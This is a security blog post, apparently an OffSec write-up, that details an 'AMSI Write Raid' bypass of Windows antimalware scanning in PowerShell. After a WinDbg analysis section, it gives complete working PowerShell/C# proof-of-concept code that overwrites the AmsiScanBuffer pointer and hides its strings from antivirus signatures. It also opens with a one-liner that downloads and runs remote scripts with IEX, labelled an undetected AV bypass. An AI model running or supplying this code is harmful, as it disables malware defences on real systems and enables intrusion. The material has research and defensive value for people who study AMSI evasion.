# AMSI Write Raid 0day Vulnerability

In this blog post, I will introduce a new 0day technique designed to bypass
AMSI without the VirtualProtect API and without changing memory
protection. I will introduce this vulnerability, that I discovered, 
and discuss how I discovered the flaw, the process I used to exploit it and build 
proof of concept code to bypass AMSI in PowerShell 5.1 and PowerShell 7.4.

## One liner AV Bypass

✅ Undetected => More info in AvBypassTricks Folder


```powershell
IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello.ps1"); IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello2.ps1"); IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello3.ps1"); MagicBypass;
```

## Introducing the AMSI vulnerability

Microsoft's Anti-Malware Scan Interface (AMSI), available in Windows 10
and later versions of Windows, was designed to help detect and prevent
malware. AMSI is an interface that integrates various security
applications (such as antivirus or anti-malware software) into
applications and software, inspecting their behavior before they are
executed.  I discovered a writable entry inside __System.Management.Automation.dll__ 
which contains the address of _AmsiScanBuffer_, a critical component of AMSI which should
have been marked read-only, similar to the Import Address Table (IAT)
entries. In this blog post, I will outline this vulnerability and reveal
how I leveraged this into a 0-day AMSI bypass. This vulnerability was
reported to Microsoft on 8 April 2024.

Throughout this blog post, I will use the latest version of Windows 11 and
[Windbg](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/),
which we discuss in detail in various OffSec Learning Modules.

I will also focus on AMSI, and leverage 64-bit Intel assembly as well as
PowerShell, which we also discuss in detail in various OffSec Learning
Modules. OffSec Learners can access links to each of these prerequisite
Modules in the Student Portal.

## AMSI Background

Microsoft's Antimalware Scan Interface (AMSI) allows run-time inspection
of various applications, services and scripts.

Most AMSI bypasses corrupt a function or a field inside the AMSI library
__Amsi.dll__ which crashes AMSI, effectively bypassing it. Beyond crashing
or patching __Amsi.dll__, attackers can bypass AMSI with _CLR Hooking_,
which involves changing the protection of the _ScanContent_ function by
invoking _VirtualProtect_ and overwriting it with a hook that returns
_TRUE_. While _VirtualProtect_ itself is not inherently malicious, malware
can misuse it to modify memory in ways that could evade detection by
Endpoint Detection and Response (EDR) systems and anti-virus (AV)
software. Given the high profile of this attack vector, most advanced
attackers generally avoid calling this API.

In this blog post, I will reveal a newly-discovered technique to bypass _AMSI_.

Let's begin by inspecting the _AmsiScanBuffer_ function of __Amsi.dll__
which scans a memory buffer for malware. Many applications and services
leverage this function. Within the _.NET framework_, the _Common Language
Runtime_ (CLR) leverages the _ScanContent_ function in the _AmsiUtils_
Class inside __System.Management.Automation.dll__, which is part of
PowerShell's core libraries and leads to the _AmsiScanBuffer_ call.

Running __[PSObject].Assembly.Location__ in PowerShell exposes the
location of this DLL, which we can reverse with __dnsspy__.
 
![Scanning Content with dnsspy](ScanContent.png) {#fig:AMSI_ScanContent}

Let's dig in to this interesting AMSI bypass.

## Analysis / Reverse Engineering

I will start by demonstrating how Vixx discovered this. To begin, I will
attach PowerShell to _windbg_. I will then set a breakpoint on the
_amsi!AmsiScanBuffer_ function, which at this point is the only function
we know will be triggered when AMSI engages.

![BreakPoint on amsi!AmsiScanBuffer](BreakPoint.png){#fig:AMSI_amsi!AmsiScanBuffer}

Next, I will run any random string in PowerShell (like _'Test'_) to trigger
the breakpoint.  Then, I will run the _k_ command in windbg to check the
call stack.

![Checking the Call Stack](call_stack.png){#fig:AMSI_call_stack_k}

As mentioned, most bypasses patch the actual _AmsiScanBuffer_ in
__Amsi.dll__. But in this case, our goal is to target something in the
_System_Management_Automation_ni_ module that leads to the
_AmsiScanbuffer_ call.

Let's unassemble backwards (with the _ub_ command) from offset 0x1071757
(__+0x1071757__) of _System_Management_Automation_ni_, the second entry
that initiated the call to _AmsiScanBuffer_ and see what's going on.

![Unassembling Backwards From System_Management_Automation_ni ](ub1.png){#fig:AMSI_ub_System_Management_Automation_}

In this case, _call rax_ is the actual call to _AmsiScanBuffer_. One way
to bypass AMSI is to patch _call rax_, which requires _VirtualProtect_.

But when Vixx followed the dereferences before the call to see how _rax_
was populated, he noticed that the address where _AmsiScanBuffer_ is
fetched is actually already writable, which opens the possibility for a
different AMSI bypass.

![Discovering PAGE_READWRITE Permissions](ub2.png){#fig:AMSI_PAGE_READWRITE}

Now that we've found this, let's attempt to understand why this happens
and if it's possible to overwrite that entry with a dummy function in
order to  bypass AMSI.

## Exploiting the Vulnerable Entry

After discovering this, Vixx set out to understand why this entry was
writable and why it was not protected like the Import Address Table (IAT).
Let's walk through his analysis of this writable entry and try to
understand how it is populated.

First, I will get the offset between our _writable entry_ and
__System.Management.Automation.ni.dll__. Let's highlight a few key commands.

First, We need to follow the dereferences highlighted with the 3 _mov_
instructions, that will end up populating rax with the address of
_AmsiScanBuffer_.

I will use _dqs_ to display a quadword (64 bits) that is 80 bytes (0x50)
before the base pointer register _rdp_, the base of the current stack
frame. We're displaying one line of output (L1) which matches the output
format of the first mov instruction  __mov r1l, qword ptr [rbp-50h]__, and
the value we received will be saved in __r11__ based on the mov
instruction.

I will then use dqs to display a quadword at 0x7ffa27c52940 (__r11__) +
0x20 which matches the format of the second mov instruction __mov r11,
qword ptr [r11+20h]__. This reveals the address 0x7ffa27e06b00 which will
be saved in r11 again based  on the mov instruction.

I will then use dqs to display a quadword at 0x7ffa27e06b00 (__r11__) which
matches the format  of the last mov instruction __mov rax, qword ptr
[r11]__. This reveals the address of __AmsiScanBuffer__ (0x7ffacfcc8260)
which will be saved  in rax and called using __call rax__ later.

We are interested in the entry that contains __AmsiScanBuffer__ which is __0x7ffa27e06b00__. This
is labeled with a calculated offset (0x786b00) from the base address of _System_Management_Automation_ni_.

Next, I will use _?_ to evaluate an expression, calculating the difference
between __0x7ffa27e06b00__ and the base address of
_System_Management_Automation_ni_. This confirms the offset between the
given memory address and the base address of the DLL (0x786b00).

![Detecting the Offset](offset.png){#fig:AMSI_detect_offset}

In this case, the offset is 0x786b00. This offset may change depending
on the local machine and version of CLR.

We can use this offset to break on read and write when the DLL is loaded
and trace how this entry is being populated and accessed.

Let's start _windbg_ with __powershell.exe__ as an argument.

![Running Windbg on PowerShell.exe](windbg_pw.png){#fig:AMSI_windbg_powershell}

Next, I will break when __System.Management.Automation.ni.dll__ is loaded
into powershell with _sxe ld System.Management.Automation.ni.dll__. Then,
I will break on read / write at _System_Management_Automation_ni +
0x786b00_ to determine how it is populated and what is accessing this
entry.

![Setting Breakpoints](Load_pw.png){#fig:AMSI_setting_breakpoints}

Windbg will break right after the instruction that wrote or read from that
memory address, so I will need to unassemble back (_ub_) to see what happened.

![Unassembling Back From Breakpoint ](ub3.png){#fig:AMSI_setting_breakpoints2}

According to the output, our breakpoint at the _SetNDirectTarget_ method
of _clrlNDirectMethodDesc_ was triggered, specifically 60 bytes (+0x3c)
offset into the function at the _mov rbx, qword ptr [rsp+30h]_
instruction. Next, we displayed the assembly code before the current
instruction with __ub clr!NDirectMethodDesc::SetNDirectTarget+Ox1e:__.

Next, our _u @rbx L1_ instruction revealed that
_rbx_, which contains the _AmsiScanBuffer_ routine address, was written to
_r14_ which contains the entry we are interested in.

If we check the call stack, I will see that this action was part of the
_clr!ThePreStub_ routine.

![Revealing the clr!ThePreStub Routine](call_stack_2.png){#fig:AMSI_clr_ThePreStub}

Let's continue execution.

![ScanContent_ function calling _AmsiScanBuffer](ub4.png){#fig:AMSI_scancontent_calling_amsiscanbuffer}

This reveals that the _mov rax,qword ptr [r11]_ instruction also accesses
this entry, but if we take a closer look, I will notice that this leads
to _call rax_ which is the call to _AmsiScanBuffer_ that we saw earlier.
This is the _ScanContent_ function calling _AmsiScanBuffer_.

This indicates that the entry was accessed when PowerShell initially
loaded, writing the _AmsiScanBuffer_ address followed by subsequent reads
and a call to the _AmsiScanBuffer_ function.

Let's take a moment to discuss _clr!ThePreStub_, a helper function in .NET
Framework that prepares the code for initial execution, which includes
just-in-time (JIT) compilation. This creates a stub that will sit between
the callee and original caller-side function.

In short, it prepares the code for JIT. According to [Matt
Warren](https://mattwarren.org/2019/09/26/Stubs-in-the-.NET-Runtime/), the
process looks something like this:

![JIT Process](JIT.png){#fig:AMSI_JIT_process}

In summary, as part of JIT, the helper function writes the
_AmsiScanBuffer_ address in the AMSI DLL entry address at offset
0x786b00, _but it does not change the permissions back to read-only_. We
can abuse this vulnerability by overwriting that entry to bypass AMSI
without invoking _VirtualProtect_.

## Coding the Bypass in PowerShell

Now we can start coding a proof of concept in PowerShell. We could use the
_System\_Management\_Automation\_ni + 0x786b00_ offset to overwrite the entry
in our code, but this approach is not entirely practical because the
offset can change based on the machine and the installed version of CLR.

A better approach would be to read 0x1000000 bytes backwards from the
memory address of _ScanContent_ using _ReadProcessMemory_ and save the
bytes in an array, which we can loop through until we find the
_AmsiScanBuffer_ address and the offset.

While testing that approach in PowerShell versions 5 and 7, Vixx ran into
access problems reading the full 0x1000000 bytes at once with a
single _ReadProcessMemory_ call. He also discovered that reading the bytes
one at a time was slow, requiring millions of _ReadProcessMemory_ calls
which was noisy and inefficient. He found a middle ground, opting to split
the data into 0x50000 (32KB) chunks.

Let's start building the code. In the first section of code, I will load
and import the required APIs in C#.

In this code, I will define an _APIs_ class with several external function
declarations that we've imported from __kernel32.dll__ using the _DllImport_
attribute. Our class also contains a _Dummy_ method which returns an
integer. Finally, I will use the _Add-Type_ cmdlet to compile this
in-memory assembly and add this class to the current PowerShell session.
I will use this dummy function later to overwrite the writable entry that
contains _AmsiScanBuffer_.

```
$APIs = @"
using System;
using System.ComponentModel;
using System.Management.Automation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

public class APIs {
    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
   
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);

    [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
    public static int Dummy() {
        return 1;
    }
}
"@

Add-Type $APIs
```
> Listing {#l:AMSI_dummy_function} - In-Memory Assembly and Dummy Function

Next, we need fetch the function address of _AmsiScanBuffer_ in memory
using _GetModuleHandle_  and _GetProcAddress_.

We need to run _GetProcAddress_ on _Amsi.dll_ to get the address of
_Amsi.dll_ in memory and next  _GetModuleHandle_ on _AmsiScanBuffer_ to
get the address of _AmsiScanBuffer_ in memory.

However, we need to be careful here. We don't want to use the strings
_Amsi.dll_ and _AmsiScanbuffer_ as these are AV signatures that will
trigger most AV products. Instead, Vixx recommends some clever string
replacements to build these strings.

Let's search for _AmsiScanBuffer_ in __System.Management.Automation.dll__,
working backwards from _ScanContent_.


This _AmsiScanBuffer_ will be the address that I will search for in
__System.Management.Automation.dll__, working backwards from _ScanContent_.

```
$string = 'hello, world'
$string = $string.replace('he','a')
$string = $string.replace('ll','m')
$string = $string.replace('o,','s')
$string = $string.replace(' ','i')
$string = $string.replace('wo','.d')
$string = $string.replace('rld','ll')

$string2 = 'hello, world'
$string2 = $string2.replace('he','A')
$string2 = $string2.replace('ll','m')
$string2 = $string2.replace('o,','s')
$string2 = $string2.replace(' ','i')
$string2 = $string2.replace('wo','Sc')
$string2 = $string2.replace('rld','an')

$string3 = 'hello, world'
$string3 = $string3.replace('hello','Bu')
$string3 = $string3.replace(', ','ff')
$string3 = $string3.replace('world','er')

$Address = [APIS]::GetModuleHandle($string)
[IntPtr] $funcAddr = [APIS]::GetProcAddress($Address, $string2 + $string3)
```
> Listing {#l:AMSI_fetching_AmsiScanBuffer} - Fetching AmsiScanBuffer Address

Since the _ScanContent_ function is inside _AmsiUtils_ class which is
inside __System.Management.Automation.dll__ I will have to perform a few
steps to find this function in our code.

First, I will loop through the loaded assemblies in PowerShell until we
find the __System.Management.Automation.dll__ assembly.

Next, I will retrieve all the classes inside that assembly and loop through
them until we find the _AmsiUtils_ class.

Finally, I will retrieve all the members inside that class and loop through
them until we find _ScanContent_.

Here's the code:

```
$Assemblies = [appdomain]::currentdomain.getassemblies()
$Assemblies |
  ForEach-Object {
    if($_.Location -ne $null){
         $split1 = $_.FullName.Split(",")[0]
         If($split1.StartsWith('S') -And $split1.EndsWith('n') -And $split1.Length -eq 28) {
                 $Types = $_.GetTypes()
         }
    }
}

$Types |
  ForEach-Object {
    if($_.Name -ne $null){
         If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
                 $Methods = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
         }
    }
}

$Methods |
  ForEach-Object {
    if($_.Name -ne $null){
         If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
                 $MethodFound = $_
         }
    }
}
```
> Listing {#l:AMSI_script_searches} - Script Searches

Now that we have the function, I will use _ReadProcessMemory_ to read
0x1000000 bytes (0x50000 bytes or 32KB at a time) from the current process
starting from _ScanContent_ going backwards until we find the address of
_AmsiScanBuffer_.

Our proof of concept will take four arguments.

The first argument will be _$InitialStart_, which is the negative offset
from _ScanContent_ that indicates where the search starts. In this case,
I will set it to the default value of _0x50000_ which means I will start
searching -0x50000 bytes from _ScanContent_.

Second, we have _$NegativeOffset_ which is the offset to subtract in each
loop from the _$InitialStart_. In each loop I will read another 0x50000
bytes, going backwards.

Next, we have _$ReadBytes_ which is the number of bytes to read with each
iteration of _ReadProcessMemory_. Here I will also read 0x50000 bytes at a
time.

Finally, _$MaxOffset_ is the total number of bytes I will search starting
from _ScanContent_, which will be 0x1000000.

Let's add the code for each of these parameters to our proof of concept.

```
# Define named parameters
param(
    $InitialStart = 0x50000,
    $NegativeOffset= 0x50000,
    $MaxOffset = 0x1000000,
    $ReadBytes = 0x50000
)
```
> Listing {#l:AMSI_parameters} - Script Parameters

Next, I will set up our loops. The first loop will read 0x50000 bytes at a
time and the second loop will search the array byte-by-byte comparing each
8 bytes to the address of _AmsiScanBuffer_ until a match is found, at
which point the loop will break.

```
[IntPtr] $MethodPointer = $MethodFound.MethodHandle.GetFunctionPointer()
[IntPtr] $Handle = [APIs]::GetCurrentProcess()
$dummy = 0

:initialloop for($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset){
    [IntPtr] $MethodPointerToSearch = [Int64] $MethodPointer - $j
    $ReadedMemoryArray = [byte[]]::new($ReadBytes)
    $ApiReturn = [APIs]::ReadProcessMemory($Handle, $MethodPointerToSearch, $ReadedMemoryArray, $ReadBytes,[ref]$dummy)
    for ($i = 0; $i -lt $ReadedMemoryArray.Length; $i += 1) {
         $bytes = [byte[]]($ReadedMemoryArray[$i], $ReadedMemoryArray[$i + 1], $ReadedMemoryArray[$i + 2], $ReadedMemoryArr>
         [IntPtr] $PointerToCompare = [bitconverter]::ToInt64($bytes,0)
         if ($PointerToCompare -eq $funcAddr) {
                 Write-Host "Found @ $($i)!"
                 [IntPtr] $MemoryToPatch = [Int64] $MethodPointerToSearch + $i
                 break initialloop
         }
    }
}
```
> Listing {#l:AMSI_loops} - Script Loops

After finding the entry address containing _AmsiScanBuffer_, I will replace
it with our Dummy function (without using _VirtualProtect_).

```
[IntPtr] $DummyPointer = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer()
$buf = [IntPtr[]] ($DummyPointer)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $MemoryToPatch, 1)
```
> Listing {#l:AMSI_dummy_function_inject} - Dummy Function Inject

Here's our completed code, which is also available on [Vixx's GitHub
repo](https://github.com/V-i-x-x/AMSI-BYPASS/):

```
function MagicBypass {

# Define named parameters
param(
    $InitialStart = 0x50000,
    $NegativeOffset= 0x50000,
    $MaxOffset = 0x1000000,
    $ReadBytes = 0x50000
)

$APIs = @"
using System;
using System.ComponentModel;
using System.Management.Automation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

public class APIs {
    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
   
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);

    [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
    public static int Dummy() {
     return 1;
    }
}
"@

Add-Type $APIs

$InitialDate=Get-Date;

$string = 'hello, world'
$string = $string.replace('he','a')
$string = $string.replace('ll','m')
$string = $string.replace('o,','s')
$string = $string.replace(' ','i')
$string = $string.replace('wo','.d')
$string = $string.replace('rld','ll')

$string2 = 'hello, world'
$string2 = $string2.replace('he','A')
$string2 = $string2.replace('ll','m')
$string2 = $string2.replace('o,','s')
$string2 = $string2.replace(' ','i')
$string2 = $string2.replace('wo','Sc')
$string2 = $string2.replace('rld','an')

$string3 = 'hello, world'
$string3 = $string3.replace('hello','Bu')
$string3 = $string3.replace(', ','ff')
$string3 = $string3.replace('world','er')

$Address = [APIS]::GetModuleHandle($string)
[IntPtr] $funcAddr = [APIS]::GetProcAddress($Address, $string2 + $string3)

$Assemblies = [appdomain]::currentdomain.getassemblies()
$Assemblies |
  ForEach-Object {
    if($_.Location -ne $null){
     $split1 = $_.FullName.Split(",")[0]
     If($split1.StartsWith('S') -And $split1.EndsWith('n') -And $split1.Length -eq 28) {
       $Types = $_.GetTypes()
     }
    }
}

$Types |
  ForEach-Object {
    if($_.Name -ne $null){
     If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
       $Methods = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
     }
    }
}

$Methods |
  ForEach-Object {
    if($_.Name -ne $null){
     If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
       $MethodFound = $_
     }
    }
}

[IntPtr] $MethodPointer = $MethodFound.MethodHandle.GetFunctionPointer()
[IntPtr] $Handle = [APIs]::GetCurrentProcess()
$dummy = 0
$ApiReturn = $false
   
:initialloop for($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset){
    [IntPtr] $MethodPointerToSearch = [Int64] $MethodPointer - $j
    $ReadedMemoryArray = [byte[]]::new($ReadBytes)
    $ApiReturn = [APIs]::ReadProcessMemory($Handle, $MethodPointerToSearch, $ReadedMemoryArray, $ReadBytes,[ref]$dummy)
    for ($i = 0; $i -lt $ReadedMemoryArray.Length; $i += 1) {
     $bytes = [byte[]]($ReadedMemoryArray[$i], $ReadedMemoryArray[$i + 1], $ReadedMemoryArray[$i + 2], $ReadedMemoryArray[$i + 3], $ReadedMemoryArray[$i + 4], $ReadedMemoryArray[$i + 5], $ReadedMemoryArray[$i + 6], $ReadedMemoryArray[$i + 7])
     [IntPtr] $PointerToCompare = [bitconverter]::ToInt64($bytes,0)
     if ($PointerToCompare -eq $funcAddr) {
       Write-Host "Found @ $($i)!"
       [IntPtr] $MemoryToPatch = [Int64] $MethodPointerToSearch + $i
       break initialloop
     }
    }
}
[IntPtr] $DummyPointer = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer()
$buf = [IntPtr[]] ($DummyPointer)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $MemoryToPatch, 1)

$FinishDate=Get-Date;
$TimeElapsed = ($FinishDate - $InitialDate).TotalSeconds;
Write-Host "$TimeElapsed seconds"
}
```
> Listing {#l:AMSI_complete_code} - Complete AMSI Write Raid Bypass

Let's save this as __universal3.ps1__ in a web-accessible directory. Next,
I will open PowerShell 5.1 and show that AMSI is in place as it blocks
_amsiutils_. _AmsiUtils_ is the class that contains the _AmsiScanBuffer_
routine, so when the AV sees any reference to _AmsiUtils_, it assumes we
are trying to bypass AMSI and block it. Then I will launch our proof of
concept with _IEX_. I will use the default parameters (which may change
based on the version of Windows or CLR). Finally, I will try to run
_amsiutils_ again to see if the bypass was successful.

![Running POC on PowerShell 5.1](POC.png){#fig:AMSI_v5_run}

It worked! We bypassed AMSI and successfully ran amsiutils. Let's try this
on PowerShell 7.4.

![Running POC on PowerShell 7.4](POC2.png){#fig:AMSI_v7_run}

Our AMSI Write Raid also worked against PowerShell 7.4! _This will bypass
Microsoft Defender and most other AV products that use AMSI_.

## Wrapping Up

In this blog post, we discussed how OffSec Technical Trainer Victor "Vixx"
Khoury discovered an advanced 0day "AMSI Write Raid" vulnerability that
can bypass AMSI without leveraging the VirtualProtect API. This technique
exploits a writable entry inside __System.Management.Automation.dll__, to
manipulate the address of _AmsiScanBuffer_ and circumvent AMSI without
changing memory protection settings. We introduced and analyzed a proof of
concept PowerShell script which bypassed AMSI in both PowerShell 5 and 7.

